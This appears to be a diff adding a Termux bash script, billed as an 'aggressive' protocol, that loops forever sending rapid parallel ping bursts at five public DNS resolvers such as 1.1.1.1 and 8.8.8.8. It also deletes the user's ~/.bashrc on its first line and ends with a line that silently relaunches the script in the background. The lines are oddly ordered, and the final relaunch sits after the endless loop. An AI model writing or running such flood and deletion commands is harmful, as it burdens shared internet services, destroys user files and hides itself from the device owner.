@@ -1,0 +1,28 @@
+rm ~/.bashrc
+#!/data/data/com.termux/files/usr/bin/bash
+
+# --- PROTOCOL: HELL-HOUND v3.0 (ULTIMATE AGGRESSION) ---
+termux-wake-lock
+
+# TARGETS: TOP-TIER GLOBAL NODES
+NODES=("1.1.1.1" "8.8.8.8" "9.9.9.9" "208.67.222.222" "1.0.0.1")
+
+# SHUTDOWN HANDLER
+trap "termux-wake-unlock; exit" SIGINT SIGTERM
+
+# THE AGGRESSOR ENGINE
+while true; do
+    for node in "${NODES[@]}"; do
+        # FORCE-G OVERDRIVE: SPAM-THREADING
+        # Launching 20 parallel threads per node with high payload
+        for i in {1..20}; do
+            (ping -c 5 -i 0.01 -s 128 $node > /dev/null 2>&1) &
+        done
+    done
+    # High-speed cycle reset
+    wait
+    sleep 0.1
+done
+# RUN THE BEAST IN BACKGROUND (SILENT MODE)
+pgrep -f ff > /dev/null || nohup bash ~/ff > /dev/null 2>&1 &
+
